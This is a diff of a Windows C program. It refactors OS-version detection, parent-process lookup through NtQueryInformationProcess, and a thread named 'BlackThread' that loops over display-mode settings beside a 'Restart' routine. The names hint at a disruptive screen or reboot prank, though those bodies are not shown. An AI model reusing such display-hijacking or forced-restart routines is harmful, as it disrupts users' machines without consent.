@@ -4,9 +4,9 @@
 
 #pragma comment(lib, "User32.lib")
 #pragma comment(lib, "Advapi32.lib")
-void Catchi();
 void s(int cathy);
 void s(LPCWSTR cathy);
+VOID GetInfo(__out LPSYSTEM_INFO lpSystemInfo);
 #pragma warning(disable:4996)
 DWORD WINAPI BlackThread(LPVOID pM);
 VOID Restart()
@@ -33,7 +33,7 @@ VOID Restart()
 }
 DWORD WINAPI BlackThread(LPVOID pM)
 {
-
+	UNREFERENCED_PARAMETER(pM);
 	DEVMODE NewDevMode = { 0 };
 	while (1)
 	{
@@ -51,7 +51,7 @@ DWORD WINAPI BlackThread(LPVOID pM)
 	}
 }
 
-typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
+//typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
 typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);
 
 BOOL GetVersionEx2(LPOSVERSIONINFOW lpVersionInformation)
@@ -69,11 +69,8 @@ BOOL GetVersionEx2(LPOSVERSIONINFOW lpVersionInformation)
 BOOL GetOSDisplayString(wchar_t *pszOS)
 {
 	OSVERSIONINFOEX osvi;
-	SYSTEM_INFO si;
-	PGNSI pGNSI;
 	BOOL bOsVersionInfoEx;
 
-	ZeroMemory(&si, sizeof(SYSTEM_INFO));
 	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
 
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
@@ -90,9 +87,7 @@ BOOL GetOSDisplayString(wchar_t *pszOS)
 	wcscat(pszOS, L".");
 	_itow_s(osvi.dwBuildNumber, tmp, 10);
 	wcscat(pszOS, tmp);
-
-	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
-	if (NULL != pGNSI)pGNSI(&si); else GetSystemInfo(&si);
+	//GetInfo(&si);
 
 	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId&&osvi.dwMajorVersion >= 6)
 	{
@@ -102,7 +97,6 @@ BOOL GetOSDisplayString(wchar_t *pszOS)
 		osvi.dwMajorVersion = ovi.dwMajorVersion;
 		osvi.dwMinorVersion = ovi.dwMinorVersion;
 		osvi.dwBuildNumber = ovi.dwBuildNumber;
-		wchar_t tmp[101];
 		_itow_s(osvi.dwMajorVersion, tmp, 10);
 		wcscpy(pszOS, tmp);
 		wcscat(pszOS, L".");
@@ -212,17 +206,17 @@ typedef LONG(__stdcall *PROCNTQSIP)(HANDLE, UINT, PVOID, ULONG, PULONG);
 DWORD GetParentProcessID(DWORD dwProcessId)
 {
 	LONG status;
-	DWORD dwParentPID = -1;
+	DWORD dwParentPID = 0;
 	HANDLE hProcess;
 	PROCESS_BASIC_INFORMATION pbi;
 
 	PROCNTQSIP NtQueryInformationProcess = (PROCNTQSIP)GetProcAddress(
 		GetModuleHandle(L"ntdll"), "NtQueryInformationProcess");
 
-	if (NULL == NtQueryInformationProcess)return -1;
+	if (NULL == NtQueryInformationProcess)return 0;
 	// Get process handle
 	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);
-	if (!hProcess)return -1;
+	if (!hProcess)return 0;
 
 	// Retrieve information
 	status = NtQueryInformationProcess(hProcess,
